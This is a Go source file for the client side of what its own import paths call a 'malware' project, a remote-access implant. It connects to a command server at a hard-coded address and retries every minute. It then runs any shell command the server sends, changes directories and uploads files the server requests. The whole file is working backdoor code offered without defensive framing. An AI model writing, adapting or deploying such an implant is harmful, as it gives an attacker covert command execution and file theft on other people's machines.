package main

//Client

import (
	"bufio"
	"fmt"
	"malware/core"
	network "malware/core/Network"
	platforms "malware/core/Platforms"
	utils "malware/core/Utils"
	"malware/models"
	"net"
	"os"
	"strings"
	"time"
)

func main() {

	var conn net.Conn

	IP := "127.0.0.1"
	Port := "9090"
begin:
	conn, err := network.ConnectionWithServer(IP, Port)
	if err != nil {
		time.Sleep(time.Minute * 1)
		goto begin
	}

	defer conn.Close()

	var userInput string
	resCmd := platforms.Run("pwd")
	utils.Encode(conn, resCmd)
	for {
		reader := bufio.NewReader(conn)
		userInput, err = reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
		}
		strCommand := strings.TrimSuffix(userInput, "\n")
		userCommand := strings.Split(strCommand, " ")

		if userCommand[0] == "download" {
			if len(userCommand) < 1 {
				continue
			}
			file, err := os.Open(userCommand[1])
			if err != nil {
				panic("could not open the file")
			}
			fileInfo, err := file.Stat()
			if err != nil {
				panic("error reading the file info")
			}
			resCmd := &models.Command{
				Lenght: fileInfo.Size(),
				Data:   []byte(fileInfo.Name()),
			}

			utils.Encode(conn, resCmd)

			go core.SendFile(&conn, userCommand[1])

			continue

		}

		if userCommand[0] == "cd" {
			if userCommand[1] == "" {
				userCommand[1] = "/"
			}
			os.Chdir(userCommand[1])
			userCommand[0] = "pwd"
		}

		resCmd := platforms.Run(userCommand[0], userCommand[1:]...)

		if userCommand[0] == "sudo" {
			os.Chown("root", 0, 0)
			continue
		}
		utils.Encode(conn, resCmd)
	}
}
